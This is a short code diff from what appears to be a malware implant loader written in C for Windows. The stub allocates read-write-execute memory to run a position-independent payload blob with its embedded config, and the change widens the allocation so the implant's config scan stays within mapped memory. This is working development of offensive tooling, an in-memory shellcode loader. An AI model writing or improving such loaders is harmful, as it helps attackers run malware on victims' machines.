@@ -447,8 +447,13 @@ static inline void stub_execute_payload(void) {
     if (pic_entry_off >= pic_size)
         pic_entry_off = 0; /* safety fallback */
 
-    /* Step 5: Allocate RWX memory for PIC blob + config */
-    SIZE_T alloc_size = (SIZE_T)pic_size + sizeof(DWORD) + (SIZE_T)config_len;
+    /* Step 5: Allocate RWX memory for PIC blob + config.
+       The implant scans up to CONFIG_SCAN_MAX (512KB) from pic_base for the
+       config magic. Ensure the allocation covers that range so the scan
+       never reads unmapped memory. VirtualAlloc zero-fills, so the extra
+       pages beyond (pic + config) are safe to scan over. */
+    SIZE_T data_size = (SIZE_T)pic_size + sizeof(DWORD) + (SIZE_T)config_len;
+    SIZE_T alloc_size = data_size < 0x80000 ? 0x80000 : data_size;
     PVOID exec_mem = pVirtualAlloc(
         NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec_mem)
